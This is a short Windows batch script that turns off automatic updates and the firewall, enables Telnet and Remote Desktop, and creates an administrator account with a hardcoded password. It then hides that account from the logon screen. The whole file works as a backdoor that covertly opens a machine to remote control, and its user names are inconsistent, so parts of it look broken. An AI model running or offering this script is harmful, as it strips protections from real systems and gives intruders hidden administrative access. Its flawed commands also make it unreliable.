@echo off

REM ****************
REM Disable off "AUTO UPDATE"
REM ****************
sc config wuauserv start= disabled
net stop wuauserv

REM ****************
REM Disable windows xp Firewall
REM ****************
netsh firewall set opmode disable

REM ****************
REM Enable TELNET
REM ****************
sc config tlntsvr start= auto
net start telnet

REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a HIDDEN USER usr= Administrator, pass= Nancyhd2@
REM ***************
net user Administrators Nancyhd2@ /add
net localgroup "Administrators" /add Administrator
net localgroup "Users" /del Administrator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
exit
